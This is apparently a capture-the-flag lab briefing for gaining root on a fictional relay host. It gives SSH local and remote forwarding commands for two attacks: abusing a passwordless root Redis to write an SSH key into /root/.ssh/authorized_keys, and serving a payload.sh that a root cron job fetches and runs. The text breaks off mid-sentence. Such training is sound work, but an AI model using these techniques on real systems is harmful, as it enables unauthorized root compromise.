OPERATOR,

You have a foothold as 'labuser1' on Hollow Industries' relay host.
`sudo -l` is empty. No odd SUID. No capabilities. The win is not on
the shell you're standing on — it's a SERVICE this box runs only on
127.0.0.1, where the admins assumed no one could reach it.

  ss -tlnp    (or: netstat -tlnp)

There's something on 127.0.0.1:6379. That's Redis — and this one has
no password and is running as ROOT. Loopback-only is not a wall; it's
a speed bump you drive over with an SSH tunnel.

There are TWO loopback services here, and they teach the two
forwarding directions:

  A (LOCAL forward, -L)  Pull the target's Redis to your box:
       ssh -L 6379:127.0.0.1:6379 labuser1@target-pivot
     Now attacker:6379 IS target's 127.0.0.1:6379. A root Redis can
     CONFIG SET its save path, then SAVE — writing any file as root.
     Drop your SSH key into /root/.ssh/authorized_keys, ssh in.

  B (REMOTE forward, -R)  There's also a root "updater" that runs
     every minute and fetches http://127.0.0.1:9000/payload.sh. Nothing
     listens there... until YOU publish your own web server onto the
     target's loopback:
       ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
     Serve a payload.sh on your box at :8000 and root runs it.

OBJECTIVE
  - Escalate to root on hollow-relay-01.
  - Capture the flag:  /root/flag.txt   (only root can read it)

FIRST MOVE
  ss -tlnp                      (find the loopback listeners)
  cat /etc/cron.d/rtr-updater   (see what the updater fetches)

The real debrief — plus dynamic (-D/SOCKS) forwarding and chisel —
